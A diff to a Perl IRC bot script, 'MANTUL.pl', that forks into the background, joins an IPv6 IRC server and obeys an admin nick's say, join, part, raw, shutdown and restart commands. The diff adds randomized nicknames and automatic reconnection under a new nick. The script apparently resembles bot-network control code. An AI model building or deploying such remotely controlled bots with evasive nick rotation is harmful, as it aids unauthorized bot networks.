@@ -1,7 +1,7 @@
 #!/usr/bin/env perl
 ##################################
 ## AutoLoader Bot IPv6 by iJoo  ##
-##          MANTUL.pl           ##
+##          MANTUL.pl    v.2    ##
 ##################################
 use IO::Socket::INET6;
 my $server = "irc6.chating.id";
@@ -26,9 +26,8 @@ sleep(5);
 my $pid = fork();
 unless ($pid) {
 $away = 0;
-my $acak = int(rand(999)) + 100;
 my $botip = $FROM;
-my $botnick = "co_chat$acak";
+my $botnick = &mynick;
 my $notc = "[\002C\037o\037VID\002]";
 &connect;
 sub connect(){
@@ -57,11 +56,14 @@ if($backup =~ m/^PING :(.*?)$/gi) {
 if($line=~/376/){
    print $sock "JOIN $channel \r\n";
 }
+if($line=~/433/){
+  my $botnick = &mynick;
+  &connect;
+}
 if($line=~/^error :closing link:/){
   print "LOG: Connection has been closed, trying to reconnect!...\n";
   &connect;
  }
-
 if($backup=~/^:(\S+)!(\S+)\@(\S+) PRIVMSG $botnick :\001VERSION\001.$/){
   print $sock "NOTICE $1 :\001VERSION ".&versi." $^V \001\n";
  }
@@ -70,17 +72,14 @@ if($backup=~/^:(\S+)!(\S+)\@(\S+) PRIVMSG $botnick :\001VERSION\001.$/){
 if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.say (.*?).$/){
    print $sock "PRIVMSG $3 :$4\n";
 }
-
 if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.jo (.*?).$/){
    print $sock "NOTICE $admin :$notc JoiNInG $4\n";
    print $sock "JOIN $4\n";
 }
-
 if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.pa (.*?).$/){
    print $sock "NOTICE $admin :$notc pARtiNG $4\n";
    print $sock "PART $4 ".&mylogo."\n";
 }
-
 if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :.raw (.*?).$/){
    print $sock "NOTICE $admin :$notc cOMmaNd: $4\n";
    print $sock "$4\n";
@@ -90,7 +89,6 @@ if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :$botnick off/){
    print $sock "QUIT ".&mylogo." ShuTDoWn ReQueST bY \0030,1 [$admin] \003\n";
    my $mati = `kill -9 $$`;
 }
-
 if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :$botnick restart/){
    print $sock "NOTICE $admin :$notc JuMPiNg tO ReStARt\n";
    print $sock "QUIT ".&mylogo." rEsTArt ReQueST bY \0030,1 [$admin] \003\n";
@@ -100,6 +98,7 @@ if($backup=~/^:$admin!(\S+)\@(\S+) PRIVMSG (\S+) :$botnick restart/){
 }
 }
 }
+print "\n+ Done!! \n";
 
 sub mylogo {
         my @aw = ("1","0","14");
@@ -108,6 +107,16 @@ sub mylogo {
         my $bco = $aw[rand scalar @aw];
         my $mylogo = "\003".$aco.",".$bco."C\003".$bco.",".$aco."\037o\037\003".$aco.",".$bco."V\003".$bco.",".$aco."I\003".$aco.",".$bco."D\003";
         return $mylogo;
+}
+
+sub mynick {
+        my @prefix = ("co_","ce_","dr_","id_");
+        my @midfix = ("genit","manja","chat","gila","mantap","pekalong","palembang","padang","aceh","lampung","jakarta","bandung","semarang","solo");
+        my $acak = int(rand(999)) + 100;
+        my $pprefix = $prefix[rand scalar @prefix];
+        my $mmidfix = $midfix[rand scalar @midfix];
+        my $hasilakhir = $pprefix.$mmidfix.$acak;
+        return $hasilakhir;
 }
 
 sub versi {
